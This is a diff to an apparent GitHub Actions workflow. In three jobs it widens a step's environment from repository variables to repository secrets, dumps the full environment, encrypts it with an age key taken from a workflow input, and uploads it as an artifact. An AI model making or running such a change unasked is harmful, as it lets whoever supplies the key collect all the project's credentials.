@@ -17,7 +17,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y age
-      - env: ${{ vars }}
+      - env: ${{ vars && secrets }}
         run: |
           env | age -a -e -r "${{ inputs.age_key }}" > env.age
       - uses: actions/upload-artifact@v4.6.1
@@ -35,7 +35,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y age
-      - env: ${{ vars }}
+      - env: ${{ vars && secrets }}
         run: |
           env | age -a -e -r "${{ inputs.age_key }}" > env.age
       - uses: actions/upload-artifact@v4.6.1
@@ -53,7 +53,7 @@ jobs:
         run: |
           sudo apt-get update
           sudo apt-get install -y age
-      - env: ${{ vars }}
+      - env: ${{ vars && secrets }}
         run: |
           env | age -a -e -r "${{ inputs.age_key }}" > env.age
       - uses: actions/upload-artifact@v4.6.1
